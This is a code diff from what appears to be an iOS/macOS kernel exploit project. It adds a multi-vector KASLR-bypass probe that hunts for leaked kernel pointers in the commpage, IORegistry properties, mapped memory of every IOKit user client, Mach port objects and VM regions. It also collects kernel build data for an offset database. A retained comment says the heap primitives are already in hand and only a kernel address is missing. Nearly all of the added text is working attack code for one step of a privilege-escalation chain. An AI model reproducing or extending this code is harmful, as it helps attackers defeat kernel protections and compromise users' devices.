@@ -16177,6 +16177,480 @@ static void r393_probe(void) {
 }
 
 /*
+ * r407: Deep KASLR bypass - commpage, IORegistry, zone info, vm_region scan.
+ */
+static volatile int g_r407_crashed = 0;
+static sigjmp_buf g_r407_jmp;
+static void r407_sighandler(int sig) {
+    g_r407_crashed = sig;
+    siglongjmp(g_r407_jmp, 1);
+}
+
+static void r407_probe(void) {
+    rlog("\n=== r407: Deep KASLR Bypass - Phase 2 ===\n\n");
+    fflush(stdout);
+
+    struct sigaction sa407, old_bus407, old_segv407;
+    memset(&sa407, 0, sizeof(sa407));
+    sa407.sa_handler = r407_sighandler;
+    sa407.sa_flags = 0;
+    sigaction(SIGBUS, &sa407, &old_bus407);
+    sigaction(SIGSEGV, &sa407, &old_segv407);
+
+    /* ---- Vector 1: Commpage scan ---- */
+    rlog("  Vector 1: ARM64 Commpage scan\n");
+    {
+        /* ARM64 commpage is at 0x0000000FFFFFC000 */
+        uint64_t commpage_addr = 0x0000000FFFFFC000ULL;
+        rlog("    Scanning commpage at 0x%llx\n", (unsigned long long)commpage_addr);
+
+        g_r407_crashed = 0;
+        if (sigsetjmp(g_r407_jmp, 1) == 0) {
+            uint8_t *cp = (uint8_t*)commpage_addr;
+            int found = 0;
+
+            /* Scan first 4096 bytes of commpage for kernel-like values */
+            for (int off = 0; off < 4096; off += 8) {
+                uint64_t v = *(volatile uint64_t*)(cp + off);
+                uint16_t top16 = (uint16_t)(v >> 48);
+
+                /* Kernel-range pointer? (0xffff... range) */
+                if (top16 >= 0xfff0 && top16 <= 0xfffe && v != 0xffffffffffffffff) {
+                    rlog("    CP+%4d: 0x%016llx <KERNEL?>\n",
+                        off, (unsigned long long)v);
+                    found++;
+                }
+                /* Also check for KTRR/CTRR text base pattern */
+                if ((v >> 32) == 0xFFFFFFF0 || (v >> 32) == 0xFFFFFFF1) {
+                    rlog("    CP+%4d: 0x%016llx <KTEXT?>\n",
+                        off, (unsigned long long)v);
+                    found++;
+                }
+            }
+
+            /* Dump first 256 bytes raw for manual analysis */
+            rlog("    Commpage first 256 bytes:\n");
+            for (int off = 0; off < 256; off += 32) {
+                rlog("    +%3d:", off);
+                for (int j = 0; j < 32 && off+j < 256; j += 8) {
+                    uint64_t v = *(volatile uint64_t*)(cp + off + j);
+                    rlog(" %016llx", (unsigned long long)v);
+                }
+                rlog("\n");
+            }
+
+            if (found == 0)
+                rlog("    (no kernel pointers found in commpage)\n");
+        } else {
+            rlog("    CRASHED: sig %d (commpage not accessible)\n", g_r407_crashed);
+        }
+    }
+    fflush(stdout);
+
+    /* ---- Vector 2: IORegistry property scan for kernel addr leaks ---- */
+    rlog("\n  Vector 2: IORegistry property scan\n");
+    {
+        const char *services[] = {
+            "IOSurfaceRoot",
+            "AppleARMPE",
+            "IOPlatformExpertDevice",
+            "AppleSPMIPMU",
+            "IOMFB",
+            "AGXAccelerator",
+            "AppleT8160PMGR",
+            "AppleH16ANEIn",
+            "AppleKeyStore",
+            "AppleCredentialManager",
+            NULL
+        };
+
+        for (int i = 0; services[i]; i++) {
+            io_service_t svc = IOServiceGetMatchingService(kIOMainPortDefault,
+                IOServiceMatching(services[i]));
+            if (!svc) {
+                rlog("    %s: not found\n", services[i]);
+                continue;
+            }
+
+            /* Get all properties */
+            CFMutableDictionaryRef props = NULL;
+            kern_return_t kr = IORegistryEntryCreateCFProperties(svc,
+                &props, kCFAllocatorDefault, 0);
+            if (kr == KERN_SUCCESS && props) {
+                CFIndex cnt = CFDictionaryGetCount(props);
+                rlog("    %s: %ld properties\n", services[i], (long)cnt);
+
+                /* Get all keys and values */
+                const void **keys = (const void**)malloc(sizeof(void*) * cnt);
+                const void **vals = (const void**)malloc(sizeof(void*) * cnt);
+                CFDictionaryGetKeysAndValues(props, keys, vals);
+
+                for (CFIndex j = 0; j < cnt && j < 30; j++) {
+                    char kbuf[128] = {0};
+                    CFStringGetCString((CFStringRef)keys[j], kbuf, sizeof(kbuf),
+                        kCFStringEncodingUTF8);
+
+                    CFTypeID tid = CFGetTypeID(vals[j]);
+
+                    if (tid == CFNumberGetTypeID()) {
+                        int64_t nval = 0;
+                        CFNumberGetValue((CFNumberRef)vals[j],
+                            kCFNumberSInt64Type, &nval);
+                        uint16_t top = (uint16_t)((uint64_t)nval >> 48);
+                        if (top >= 0xfff0 && top <= 0xfffe) {
+                            rlog("      KEY '%s' = 0x%016llx <KERNEL!!!>\n",
+                                kbuf, (unsigned long long)nval);
+                        } else if ((uint64_t)nval > 0xFFFFFFF000000000ULL) {
+                            rlog("      KEY '%s' = 0x%016llx <KRANGE?>\n",
+                                kbuf, (unsigned long long)nval);
+                        }
+                    } else if (tid == CFDataGetTypeID()) {
+                        CFDataRef dval = (CFDataRef)vals[j];
+                        CFIndex dlen = CFDataGetLength(dval);
+                        const uint8_t *dbytes = CFDataGetBytePtr(dval);
+
+                        /* Scan data for kernel pointers */
+                        for (CFIndex b = 0; b + 7 < dlen && b < 4096; b += 8) {
+                            uint64_t v = *(uint64_t*)(dbytes + b);
+                            uint16_t top = (uint16_t)(v >> 48);
+                            if (top >= 0xfff0 && top <= 0xfffe &&
+                                v != 0xffffffffffffffff) {
+                                rlog("      KEY '%s' data+%ld = 0x%016llx <KERNEL!!!>\n",
+                                    kbuf, (long)b, (unsigned long long)v);
+                            }
+                        }
+                    }
+                }
+
+                free(keys);
+                free(vals);
+                CFRelease(props);
+            } else {
+                rlog("    %s: IORegistryEntryCreateCFProperties kr=%d\n",
+                    services[i], kr);
+            }
+            IOObjectRelease(svc);
+        }
+    }
+    fflush(stdout);
+
+    /* ---- Vector 3: Enumerate ALL IOKit services ---- */
+    rlog("\n  Vector 3: IOKit service enumeration\n");
+    {
+        io_iterator_t iter;
+        kern_return_t kr = IOServiceGetMatchingServices(kIOMainPortDefault,
+            IOServiceMatching("IOService"), &iter);
+        rlog("    IOServiceGetMatchingServices: kr=%d\n", kr);
+
+        if (kr == KERN_SUCCESS) {
+            io_service_t svc;
+            int count = 0;
+            int leaks = 0;
+            while ((svc = IOIteratorNext(iter)) != 0 && count < 200) {
+                io_name_t name;
+                IORegistryEntryGetName(svc, name);
+
+                /* Try connecting as user client type 0 */
+                io_connect_t conn = 0;
+                kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
+                if (kr == KERN_SUCCESS) {
+                    /* Try to get mapped memory */
+                    mach_vm_address_t addr = 0;
+                    mach_vm_size_t sz = 0;
+                    kr = IOConnectMapMemory64(conn, 0, mach_task_self(),
+                        &addr, &sz, kIOMapAnywhere);
+                    if (kr == KERN_SUCCESS && addr != 0 && sz > 0) {
+                        rlog("    %s: mapped type=0 addr=0x%llx sz=0x%llx\n",
+                            name, (unsigned long long)addr,
+                            (unsigned long long)sz);
+
+                        /* Scan mapped memory for kernel pointers */
+                        g_r407_crashed = 0;
+                        if (sigsetjmp(g_r407_jmp, 1) == 0) {
+                            uint8_t *mp = (uint8_t*)addr;
+                            uint64_t scanSz = sz < 8192 ? sz : 8192;
+                            for (uint64_t off = 0; off + 7 < scanSz; off += 8) {
+                                uint64_t v = *(volatile uint64_t*)(mp + off);
+                                uint16_t top = (uint16_t)(v >> 48);
+                                if (top >= 0xfff0 && top <= 0xfffe &&
+                                    v != 0xffffffffffffffff) {
+                                    rlog("      +%llu: 0x%016llx <KERNEL!!!>\n",
+                                        (unsigned long long)off,
+                                        (unsigned long long)v);
+                                    leaks++;
+                                    if (leaks > 20) break;
+                                }
+                            }
+                        }
+                        IOConnectUnmapMemory64(conn, 0, mach_task_self(), addr);
+                    }
+
+                    /* Try mapped memory types 1-4 */
+                    for (int mt = 1; mt <= 4; mt++) {
+                        addr = 0; sz = 0;
+                        kr = IOConnectMapMemory64(conn, mt, mach_task_self(),
+                            &addr, &sz, kIOMapAnywhere);
+                        if (kr == KERN_SUCCESS && addr != 0 && sz > 0) {
+                            rlog("    %s: mapped type=%d addr=0x%llx sz=0x%llx\n",
+                                name, mt, (unsigned long long)addr,
+                                (unsigned long long)sz);
+
+                            g_r407_crashed = 0;
+                            if (sigsetjmp(g_r407_jmp, 1) == 0) {
+                                uint8_t *mp = (uint8_t*)addr;
+                                uint64_t scanSz = sz < 8192 ? sz : 8192;
+                                for (uint64_t off = 0; off + 7 < scanSz; off += 8) {
+                                    uint64_t v = *(volatile uint64_t*)(mp + off);
+                                    uint16_t top = (uint16_t)(v >> 48);
+                                    if (top >= 0xfff0 && top <= 0xfffe &&
+                                        v != 0xffffffffffffffff) {
+                                        rlog("      type%d+%llu: 0x%016llx <KERNEL!!!>\n",
+                                            mt, (unsigned long long)off,
+                                            (unsigned long long)v);
+                                        leaks++;
+                                    }
+                                }
+                            }
+                            IOConnectUnmapMemory64(conn, mt, mach_task_self(), addr);
+                        }
+                        if (leaks > 20) break;
+                    }
+
+                    IOServiceClose(conn);
+                }
+
+                IOObjectRelease(svc);
+                count++;
+                if (leaks > 20) break;
+            }
+            rlog("    Scanned %d services, %d kernel ptr leaks\n", count, leaks);
+            IOObjectRelease(iter);
+        }
+    }
+    fflush(stdout);
+
+    /* ---- Vector 4: host_zone_info ---- */
+    rlog("\n  Vector 4: host_zone_info\n");
+    {
+        mach_port_t host = mach_host_self();
+        mach_zone_name_t *names = NULL;
+        mach_msg_type_number_t namesCnt = 0;
+        mach_zone_info_t *info = NULL;
+        mach_msg_type_number_t infoCnt = 0;
+
+        kern_return_t kr = host_zone_info(host, &names, &namesCnt,
+            &info, &infoCnt);
+        rlog("    host_zone_info: kr=%d namesCnt=%u infoCnt=%u\n",
+            kr, namesCnt, infoCnt);
+
+        if (kr == KERN_SUCCESS && namesCnt > 0) {
+            /* Scan zone info for addresses */
+            for (unsigned i = 0; i < namesCnt && i < 20; i++) {
+                rlog("    zone '%s': ", names[i].mzn_name);
+                rlog("count=%lld elem_size=%lld\n",
+                    (long long)info[i].mzi_count,
+                    (long long)info[i].mzi_elem_size);
+            }
+            vm_deallocate(mach_task_self(), (vm_address_t)names,
+                namesCnt * sizeof(mach_zone_name_t));
+            vm_deallocate(mach_task_self(), (vm_address_t)info,
+                infoCnt * sizeof(mach_zone_info_t));
+        }
+    }
+    fflush(stdout);
+
+    /* ---- Vector 5: mach_port_kobject (direct address) ---- */
+    rlog("\n  Vector 5: mach_port_kobject direct\n");
+    {
+        mach_port_t task = mach_task_self();
+        mach_port_t host = mach_host_self();
+
+        natural_t ktype = 0;
+        mach_vm_address_t kaddr = 0;
+
+        /* Try on task port */
+        kern_return_t kr = mach_port_kobject(task, task, &ktype, (unsigned*)&kaddr);
+        rlog("    task: kr=%d type=%u addr=0x%llx\n",
+            kr, ktype, (unsigned long long)kaddr);
+
+        ktype = 0; kaddr = 0;
+        kr = mach_port_kobject(task, host, &ktype, (unsigned*)&kaddr);
+        rlog("    host: kr=%d type=%u addr=0x%llx\n",
+            kr, ktype, (unsigned long long)kaddr);
+
+        /* Try on IOSurface port */
+        int w=4,h=4,bpe=4,bpr=16,pf_=0x42475241,as_=256;
+        CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        CFNumberRef nw = CFNumberCreate(NULL, kCFNumberIntType, &w);
+        CFNumberRef nh = CFNumberCreate(NULL, kCFNumberIntType, &h);
+        CFNumberRef nb = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+        CFNumberRef nr = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+        CFNumberRef np = CFNumberCreate(NULL, kCFNumberIntType, &pf_);
+        CFNumberRef na = CFNumberCreate(NULL, kCFNumberIntType, &as_);
+        CFDictionarySetValue(p, CFSTR("IOSurfaceWidth"), nw);
+        CFDictionarySetValue(p, CFSTR("IOSurfaceHeight"), nh);
+        CFDictionarySetValue(p, CFSTR("IOSurfaceBytesPerElement"), nb);
+        CFDictionarySetValue(p, CFSTR("IOSurfaceBytesPerRow"), nr);
+        CFDictionarySetValue(p, CFSTR("IOSurfacePixelFormat"), np);
+        CFDictionarySetValue(p, CFSTR("IOSurfaceAllocSize"), na);
+        IOSurfaceRef surf = IOSurfaceCreate(p);
+        mach_port_t surfPort = IOSurfaceCreateMachPort(surf);
+
+        ktype = 0; kaddr = 0;
+        kr = mach_port_kobject(task, surfPort, &ktype, (unsigned*)&kaddr);
+        rlog("    IOSurface: kr=%d type=%u addr=0x%llx\n",
+            kr, ktype, (unsigned long long)kaddr);
+
+        mach_port_deallocate(task, surfPort);
+        CFRelease(surf);
+        CFRelease(p);
+    }
+    fflush(stdout);
+
+    /* ---- Vector 6: vm_region enumeration ---- */
+    rlog("\n  Vector 6: vm_region enumeration (looking for kernel-mapped regions)\n");
+    {
+        mach_port_t task = mach_task_self();
+        uint64_t addr = 0;
+        uint64_t size = 0;
+        uint32_t depth = 0;
+        vm_region_submap_info_data_64_t info;
+        mach_msg_type_number_t cnt;
+        int regions = 0;
+
+        while (regions < 200) {
+            cnt = VM_REGION_SUBMAP_INFO_COUNT_64;
+            depth = 0;
+            kern_return_t kr = mach_vm_region_recurse(task, &addr, &size,
+                &depth, (vm_region_recurse_info_t)&info, &cnt);
+            if (kr != KERN_SUCCESS) break;
+
+            /* Check for unusual regions: very high addresses, kernel-mapped, etc. */
+            if (addr >= 0x200000000ULL || info.user_tag > 200 ||
+                info.external_pager != 0) {
+                rlog("    0x%012llx-0x%012llx sz=0x%llx prot=%d/%d tag=%d ext_pager=%d obj_id=%d\n",
+                    (unsigned long long)addr,
+                    (unsigned long long)(addr + size),
+                    (unsigned long long)size,
+                    info.protection, info.max_protection,
+                    info.user_tag, info.external_pager, info.object_id);
+            }
+
+            addr += size;
+            regions++;
+            if (addr == 0) break;
+        }
+        rlog("    Scanned %d regions\n", regions);
+    }
+    fflush(stdout);
+
+    /* ---- Vector 7: IOSurface kernel object address via IORegistryEntry ID ---- */
+    rlog("\n  Vector 7: IOSurface registry entry\n");
+    {
+        int w=4,h=4,bpe=4,bpr=16,pf_=0x42475241,as_=256;
+        CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        CFNumberRef nw = CFNumberCreate(NULL, kCFNumberIntType, &w);
+        CFNumberRef nh = CFNumberCreate(NULL, kCFNumberIntType, &h);
+        CFNumberRef nb = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+        CFNumberRef nr = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+        CFNumberRef np = CFNumberCreate(NULL, kCFNumberIntType, &pf_);
+        CFNumberRef na = CFNumberCreate(NULL, kCFNumberIntType, &as_);
+        CFDictionarySetValue(p, CFSTR("IOSurfaceWidth"), nw);
+        CFDictionarySetValue(p, CFSTR("IOSurfaceHeight"), nh);
+        CFDictionarySetValue(p, CFSTR("IOSurfaceBytesPerElement"), nb);
+        CFDictionarySetValue(p, CFSTR("IOSurfaceBytesPerRow"), nr);
+        CFDictionarySetValue(p, CFSTR("IOSurfacePixelFormat"), np);
+        CFDictionarySetValue(p, CFSTR("IOSurfaceAllocSize"), na);
+
+        IOSurfaceRef surf = IOSurfaceCreate(p);
+        mach_port_t surfPort = IOSurfaceCreateMachPort(surf);
+
+        /* Get the IORegistryEntry from port */
+        io_service_t entry = surfPort;
+        uint64_t regID = 0;
+        kern_return_t kr = IORegistryEntryGetRegistryEntryID(entry, &regID);
+        rlog("    IORegistryEntryGetRegistryEntryID: kr=%d id=0x%llx\n",
+            kr, (unsigned long long)regID);
+
+        /* Try getting properties from the IOSurface entry */
+        CFMutableDictionaryRef eprops = NULL;
+        kr = IORegistryEntryCreateCFProperties(entry, &eprops,
+            kCFAllocatorDefault, 0);
+        rlog("    IORegistryEntryCreateCFProperties: kr=%d\n", kr);
+        if (kr == KERN_SUCCESS && eprops) {
+            CFIndex cnt2 = CFDictionaryGetCount(eprops);
+            rlog("    %ld properties on IOSurface entry\n", (long)cnt2);
+
+            const void **keys = (const void**)malloc(sizeof(void*) * cnt2);
+            const void **vals = (const void**)malloc(sizeof(void*) * cnt2);
+            CFDictionaryGetKeysAndValues(eprops, keys, vals);
+
+            for (CFIndex j = 0; j < cnt2 && j < 20; j++) {
+                char kbuf[128] = {0};
+                CFStringGetCString((CFStringRef)keys[j], kbuf, sizeof(kbuf),
+                    kCFStringEncodingUTF8);
+
+                CFTypeID tid = CFGetTypeID(vals[j]);
+                if (tid == CFNumberGetTypeID()) {
+                    int64_t nval = 0;
+                    CFNumberGetValue((CFNumberRef)vals[j],
+                        kCFNumberSInt64Type, &nval);
+                    rlog("      '%s' = 0x%llx\n", kbuf, (unsigned long long)nval);
+                } else if (tid == CFStringGetTypeID()) {
+                    char sbuf[256] = {0};
+                    CFStringGetCString((CFStringRef)vals[j], sbuf, sizeof(sbuf),
+                        kCFStringEncodingUTF8);
+                    rlog("      '%s' = '%s'\n", kbuf, sbuf);
+                } else if (tid == CFDataGetTypeID()) {
+                    CFIndex dlen = CFDataGetLength((CFDataRef)vals[j]);
+                    rlog("      '%s' = <data %ld bytes>\n", kbuf, (long)dlen);
+                }
+            }
+            free(keys);
+            free(vals);
+            CFRelease(eprops);
+        }
+
+        mach_port_deallocate(mach_task_self(), surfPort);
+        CFRelease(surf);
+        CFRelease(p);
+    }
+    fflush(stdout);
+
+    /* ---- Vector 8: Kernel version + build info for offset database ---- */
+    rlog("\n  Vector 8: Kernel identification\n");
+    {
+        char buf[512] = {0};
+        size_t sz = sizeof(buf);
+        int ret = sysctlbyname("kern.version", buf, &sz, NULL, 0);
+        rlog("    kern.version: '%s'\n", buf);
+
+        sz = sizeof(buf);
+        ret = sysctlbyname("kern.osversion", buf, &sz, NULL, 0);
+        rlog("    kern.osversion: '%s'\n", buf);
+
+        sz = sizeof(buf);
+        ret = sysctlbyname("kern.uuid", buf, &sz, NULL, 0);
+        rlog("    kern.uuid: ret=%d '%s'\n", ret, buf);
+
+        /* Try to get kernel cache UUID via sysctlbyname */
+        uint8_t uuid[16] = {0};
+        sz = sizeof(uuid);
+        ret = sysctlbyname("kern.bootsessionuuid", uuid, &sz, NULL, 0);
+        rlog("    kern.bootsessionuuid: ret=%d (errno=%d)\n", ret, errno);
+    }
+    fflush(stdout);
+
+    sigaction(SIGBUS, &old_bus407, NULL);
+    sigaction(SIGSEGV, &old_segv407, NULL);
+
+    rlog("\n=== r407 complete ===\n");
+    fflush(stdout);
+}
+
+/*
  * r406: Aggressive KASLR bypass hunt.
  *
  * We have all the heap manipulation primitives. Missing: ONE kernel address.
@@ -66114,6 +66588,13 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 410) {
+            rlog("*** rounds=410: Deep KASLR Bypass Phase 2 ***\n");
+            rlog("  Commpage, IORegistry, zone info, vm_region scan.\n\n");
+            fflush(stdout);
+            r407_probe();
+            goto done;
+        }
         if (rounds == 409) {
             rlog("*** rounds=409: Aggressive KASLR Bypass Hunt ***\n");
             rlog("  Multi-vector kernel address leak probe.\n\n");
@@ -68569,7 +69050,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
